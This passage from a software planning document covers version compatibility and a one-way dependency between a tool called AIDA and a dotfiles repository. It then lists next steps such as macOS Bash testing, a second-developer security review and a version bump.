- Version compatibility: AIDA 0.2.0 works with dotfiles requiring >=0.1.0
- One-way dependency: dotfiles → AIDA (AIDA never sources from dotfiles)

**NEXT STEPS**:

1. Begin implementation with Phase 1 (library structure)
2. Resolve Q1/Q2 during implementation (realpath fallback, stat syntax)
3. Test on macOS Bash 3.2.57 before merge
4. Security review by second developer before merging
5. Update VERSION to 0.1.2 for release
